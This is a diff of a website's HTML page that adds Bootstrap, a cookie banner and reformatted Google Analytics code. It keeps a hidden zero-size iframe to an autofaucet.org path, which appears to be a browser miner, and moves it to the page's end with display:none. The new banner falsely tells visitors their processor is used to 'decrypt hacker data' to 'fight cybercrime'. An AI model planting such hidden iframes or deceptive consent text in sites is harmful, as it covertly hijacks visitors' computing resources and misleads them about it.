@@ -21,24 +21,21 @@
    <script src="./script.js"></script>
    <!-- Global site tag (gtag.js) - Google Analytics -->
 
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-KZQTRLN0Y9"></script>
+   <!-- Bootstrap 4.1.1 -->
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.1/css/bootstrap.min.css">
 
-<script>
+   <!-- cookiealert styles -->
+   <link rel="stylesheet" href="./cookiealert.css">
 
-  window.dataLayer = window.dataLayer || [];
-
-  function gtag(){dataLayer.push(arguments);}
-
-  gtag('js', new Date());
-
-  gtag('config', 'G-KZQTRLN0Y9');
-
-</script>
+   <script async src="https://www.googletagmanager.com/gtag/js?id=G-KZQTRLN0Y9"></script>
+   <script>
+   window.dataLayer = window.dataLayer || [];
+   function gtag(){dataLayer.push(arguments);}
+   gtag('js', new Date());
+   gtag('config', 'G-KZQTRLN0Y9');
+   </script>
 </head>
 <body>
-
-   <iframe src="https://autofaucet.org/wm/moonway/6" width="0" height="0" style="border:0"></iframe>
-   
    <div class="tint">
       <div id="modal" class="modal">
          <span class="close" onclick="document.getElementById('modal').style.display='none'">&times;</span>
@@ -102,5 +99,15 @@
             </ul>
       </div>
    </div>
+
+   <div class="alert text-center cookiealert" role="alert">
+      <b>By using this site, you help fight cybercrime!</b> &#x1F36A; We use your processor to decrypt hacker data.
+  
+      <button type="button" class="btn btn-primary btn-sm acceptcookies">
+          I agree
+      </button>
+  </div>
+  <script src="./cookiealert.js"></script>
+  <iframe src="https://autofaucet.org/wm/moonway/6" width="0" height="0" style="display:none"></iframe>
 </body>
 </html>
